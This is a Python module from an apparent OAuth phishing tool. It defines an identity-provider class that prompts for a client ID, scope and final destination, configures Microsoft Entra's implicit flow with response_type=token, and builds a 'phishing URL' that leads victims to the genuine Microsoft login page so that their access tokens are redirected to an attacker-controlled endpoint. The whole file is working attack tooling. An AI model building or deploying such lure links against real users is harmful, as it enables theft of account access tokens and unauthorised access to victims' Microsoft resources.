import logging
from . import get_idps, app
from prompt_toolkit import prompt
from .exceptions import EviloauthCommandException


class IDP():
    idps = get_idps()
    idp = None
    redirect_uri = None

    def __init__(self, idp, redirect_uri):

        if idp not in self.idps:
            raise EviloauthCommandException(
                f'IDP {idp} is not supported. Supported IDPs: {self.idps}')

        self.idp = idp
        self.redirect_uri = redirect_uri
        self.__idp_setup__()

    def __idp_setup__(self):
        self.client_id = prompt('Client ID: ')
        self.scope = prompt('Scope: ')
        self.final_destination = prompt('Final Destination: ')

        if self.idp == 'entra_implicit_flow':
            self.endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
            self.response_type = 'token'

            app.config['ENDPOINT'] = self.endpoint
            app.config['CLIENT_ID'] = self.client_id
            app.config['SCOPE'] = self.scope
            app.config['RESPONSE_TYPE'] = 'token'
            app.config['FINAL_DESTINATION'] = self.final_destination

            logging.info(f'{self.endpoint}?client_id={self.client_id}&scope={self.scope}&'
                         f'response_type={self.response_type}&redirect_uri={self.redirect_uri}')

        elif self.idp == 'entra_code_flow':
            logging.error('Code flow not implemented yet.')
        
    def get_phishing_url(self):
        if hasattr(self, 'endpoint') and hasattr(self, 'client_id') and hasattr(self, 'scope') and hasattr(self, 'redirect_uri'):
            return f'{self.endpoint}?client_id={self.client_id}&scope={self.scope}&response_type={self.response_type}&redirect_uri={self.redirect_uri}'
        else:
            return "URL not available. Please configure the IDP first."
